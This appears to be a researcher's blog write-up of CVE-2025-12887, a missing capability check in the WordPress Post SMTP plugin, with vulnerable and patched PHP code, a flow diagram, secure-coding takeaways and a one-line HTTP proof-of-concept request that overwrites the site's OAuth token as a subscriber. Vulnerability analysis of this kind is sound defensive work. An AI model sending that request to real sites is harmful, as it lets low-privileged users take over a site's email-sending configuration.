# CVE-2025-12887 Analysis & POC


<!--more-->

## CVE & Basic Info

The **Post SMTP** plugin for **WordPress** is vulnerable to **authorization bypass** in all versions up to and including **3.6.1**. The issue arises because the plugin does not properly verify whether a **user** is allowed to update the **OAuth token** in the **`handle_gmail_oauth_redirect`** function. This allows an **authenticated attacker**, with access as low as a **subscriber** role or higher, to inject **invalid or attacker-controlled OAuth credentials**.

* **CVE ID**: [CVE-2025-12887](https://www.cve.org/CVERecord?id=CVE-2025-12887)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 3.6.1
* **Patched Versions**: 3.6.2
* **CVSS Severity**: Low (5.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress Post SMTP Plugin](https://wordpress.org/plugins/post-smtp/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version – Post SMTP**

  * `3.6.1` – **vulnerable**
  * `3.6.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any other diff tool.

## Analysis

The plugin registers an action hook:

```php {title="NewWizard.php v3.6.1" data-open=true hl_lines=[]}
add_action( 'admin_init', array( $this, 'handle_gmail_oauth_redirect' ) );
```

* **`admin_init` Hook**
  This is a WordPress hook that is triggered **every time a logged-in user accesses the admin area**. It runs early in the admin page initialization process, before any content is displayed.

* **Action registration**
  The Post SMTP plugin registers the `handle_gmail_oauth_redirect` function to the `admin_init` hook. This means **any logged-in user** (even a low-privileged user such as a *subscriber*) can trigger this function simply by accessing an admin page.

**In the vulnerable version (v3.6.1):**

```php {title="NewWizard.php v3.6.1" data-open=true hl_lines=[21]}
public function handle_gmail_oauth_redirect() {
    // Check if the required OAuth parameters are present in the URL.
    if ( isset( $_GET['action'] ) && $_GET['action'] === 'gmail_oauth_redirect' ) {
        // Sanitize and retrieve URL parameters
        $access_token  = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null;
        $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null;
        $expires_in    = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0;
        $msg           = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : '';
        $user_email    = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : '';
        $auth_token_expires = time() + $expires_in;

        if ( $access_token ) {
            $oauth_data = array(
                'access_token'      => $access_token,
                'refresh_token'     => $refresh_token,
                'auth_token_expires'=> $auth_token_expires,
                'vendor_name'       => 'google',
                'user_email'        => $user_email,
            );
            // Save the OAuth parameters to the WordPress options table.
            update_option( 'postman_auth_token', $oauth_data );
        }
    }
}
```

The logic of `handle_gmail_oauth_redirect` shows how the Post SMTP plugin processes **OAuth tokens** from Gmail. However, there are critical weaknesses:

* A logged-in user only needs to access an admin page with the parameters `action=gmail_oauth_redirect` and `access_token` in the URL to trigger the update logic.
* There is **no capability check** to ensure that only administrators are allowed to perform this action.

**Patched version (v3.6.2):**

```php {title="NewWizard.php v3.6.2" data-open=true hl_lines=[6,11,16,38]}
public function handle_gmail_oauth_redirect() {
    // Check if the required OAuth parameters are present in the URL.
    if ( isset( $_GET['action'] ) && $_GET['action'] === 'gmail_oauth_redirect' ) {
        
    // Capability check: Only allow administrators to update OAuth tokens
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( esc_html__( 'You do not have sufficient permissions to access this page.', 'post-smtp' ) );
    }
    
    // CSRF protection: Verify nonce (required by security report)
    if ( ! isset( $_GET['_wpnonce'] ) || empty( $_GET['_wpnonce'] ) ) {
        wp_die( esc_html__( 'Security check failed. Nonce is missing.', 'post-smtp' ) );
    }
    
    // Verify the nonce
    $nonce = sanitize_text_field( $_GET['_wpnonce'] );
    if ( ! wp_verify_nonce( $nonce, 'gmail_oauth_redirect' ) ) {
        wp_die( esc_html__( 'Security check failed. Invalid nonce. Please try again.', 'post-smtp' ) );
    }
        
        // Sanitize and retrieve URL parameters
        $access_token  = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null;
        $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null;
        $expires_in    = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0;
        $msg           = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : '';
        $user_email    = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : '';
        $auth_token_expires = time() + $expires_in;

        if ( $access_token ) {
            $oauth_data = array(
                'access_token'      => $access_token,
                'refresh_token'     => $refresh_token,
                'auth_token_expires'=> $auth_token_expires,
                'vendor_name'       => 'google',
                'user_email'        => $user_email,
            );
            // Save the OAuth parameters to the WordPress options table.
            update_option( 'postman_auth_token', $oauth_data );
        }
    }
}
```

The patch introduces:

1. **Capability check**
   Only administrators (users with the `manage_options` capability) are allowed to update the **OAuth token**.

2. **CSRF protection using a nonce**
   A **nonce verification** is added to ensure that the request actually originates from a legitimate WordPress page, preventing **CSRF (Cross-Site Request Forgery)** attacks.

## Flow

{{< mermaid >}}
graph TD
A["Authenticated user (Subscriber or higher)"]
--> B["Access admin area: /wp-admin/"]
--> C["admin_init hook is triggered"]
--> D["Post SMTP: handle_gmail_oauth_redirect() is executed"]
--> E{"Is GET[action] = gmail_oauth_redirect ?"}
E -- No --> F["Function exits – No impact"]
E -- Yes --> G["Read parameters from URL: access_token, refresh_token, expires_in, user_email"]
--> H{"Is access_token present ?"}
H -- No --> F
H -- Yes --> I["Build OAuth data array"]
--> J["update_option('postman_auth_token', oauth_data)"]
--> K["OAuth token is overwritten by attacker-controlled data"]
{{< /mermaid >}}

## Proof of Concept (PoC)

Send the following request while authenticated as a **Subscriber+** user:

```http
GET /wp-admin/?action=gmail_oauth_redirect&access_token=access_token_payload&refresh_token=refresh_to_payload&expires_in=expires_in_payload&user_email=user_email@gmail.com HTTP/1.1
Host: localhost
Cookie: subscriber+ cookie
```

## Conclusion

The CVE-2025-12887 vulnerability stems from the Post SMTP plugin directly binding the `handle_gmail_oauth_redirect` function to the `admin_init` hook without performing any capability checks or additional authentication mechanisms. This allows any authenticated user, even with low privileges such as **Subscriber/Contributor**, to send arbitrary requests that overwrite the `postman_auth_token` value in the WordPress `options` table.

The absence of a **capability check** and **nonce verification** created a critical weakness in the OAuth handling workflow, potentially allowing attackers to take control over the site’s email sending configuration. This issue was resolved in version 3.6.2 by restricting execution to administrators and introducing nonce validation to prevent forged requests.

## Key Takeaways

* Never attach sensitive actions (such as token updates) to general hooks like `admin_init` without validating user privileges.
* Always use `current_user_can()` to ensure that only appropriate roles can perform high-risk actions.
* Enforce **nonce verification** for any state-changing request to protect against CSRF.
* Do not trust data coming from `$_GET` or `$_POST` without proper authentication and authorization controls.
* Updating OAuth tokens should be treated as an administrative action and protected as strictly as other critical system changes.

## References

[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress Post SMTP Plugin <= 3.6.1 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability)


---

> Author: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/posts/2025-12-08-cve-2025-12887/  

